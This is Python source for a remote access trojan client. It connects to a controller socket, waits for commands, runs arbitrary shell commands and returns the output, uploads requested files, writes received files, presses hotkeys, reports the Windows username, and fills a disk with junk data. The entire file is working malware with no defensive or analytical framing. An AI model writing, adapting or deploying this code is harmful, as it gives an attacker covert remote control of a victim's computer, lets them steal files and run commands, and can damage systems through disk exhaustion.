from socket import *
from colorama import Fore
from subprocess import getoutput
from re import findall
from pyautogui import click, hotkey, press, size, typewrite
from requests import get, exceptions
from time import sleep
import os
from datetime import datetime


BYTE_SIZE = 700 * 1024 * 1024

HOST = "localhost"

PORT = 8080


def check_internet_conection() -> bool:
    try:
        get("https://www.google.com",timeout=5)
        return True
    except Exception as err: 
        return False

while check_internet_conection() == False:
    sleep(2)
    print("No internet connection")

# find ip4 address
def get_ipv4_address():
    while True:
        result = getoutput("ipconfig")

        ip_addresses = findall(r"   IPv4 Address. . . . . . . . . . . : (.*)", result)
        print(ip_addresses)
        try:
            ip_address = ip_addresses[1]
        except IndexError:
            print("Could not find")
            continue

        print(f"{Fore.GREEN} IPv4 Address: {ip_address}")

        return ip_address

conection = socket(AF_INET,SOCK_STREAM)


def content():
    global conection
    while True:
        try:
            conection.connect((HOST, PORT))

            print("Connected")
            
            break
        except ConnectionRefusedError:
            pass

        except OSError:
            print("Try to connect ...")
            conection.close()
            del conection
            conection = socket(AF_INET,SOCK_STREAM)
            sleep(2)

    return conection


conection = content()


def create_file_name():
    return f"{str(datetime.now().strftime('%Y%m%d_%H%M%S'))}"


def send_file(file_path):
    with open(file_path, 'rb') as file:
        ch = file.read(1024)
        while (ch):
            conection.send(ch)
            ch = file.read(1024)
        sleep(4)
        conection.send("rat sending file = 0".encode('utf-8'))
        print("Sended")

def save_file(data):
    filename = create_file_name()
    
    bytes_txt , file_format = data.split("#")

    with open(f"{filename}{file_format}", 'wb') as file:

        file.write(bytes_txt)

        print(f"{Fore.GREEN}{filename} Saved!")
    
def run_cmd_command(command):
    result = getoutput(rf'{command}',encoding="UTF-8")
    
    if result == '':
        result = "runed"

    conection.send(result.encode(encoding="UTF-8"))

def press_hotkey(keys):
    hotkey(keys.split("+"))

    conection.send("Runed".encode())


def get_windows_username(value):
    user = os.getlogin()
    conection.send(f"{value} : {user}".encode())

def increase_file_size(data):
    file_path, size_mg = data.split("|")

    size_mg = int(size_mg)

    target_size = size_mg * 1024 * 1024

    with open(file_path, 'w') as file:
        pass

    with open(file_path, 'ab') as file:

        while os.path.getsize(file_path) < target_size:

            text = b"DIGE GOHNAKHORIYAAAAA INTORYAST" * 1024 * 1024

            file.write(text)

    conection.send("Runed".encode())

while True:
        shell = conection.recv(BYTE_SIZE).decode()
        
        print(f"{Fore.YELLOW} Command : {shell}")
        

        if shell == "":
            print("Invalid Command Format")

            conection = content()

            continue

        try:

            function_name, value = shell.split("!")

        except ValueError:

            print("Invalid Command Format")

            conection.send("Invalid Command Format!".encode())
            
            continue
        
        if function_name == "cmd":
            run_cmd_command(value)

        elif function_name == "gf":
            send_file(value)
        
        elif function_name == "sf":
            save_file(value)
        
        elif function_name == "hk":
            press_hotkey(value)

        elif function_name == "gwun":
            get_windows_username(value)

        elif function_name == "lfv":
            increase_file_size(value)

        else:
            conection.send("command not fund!".encode())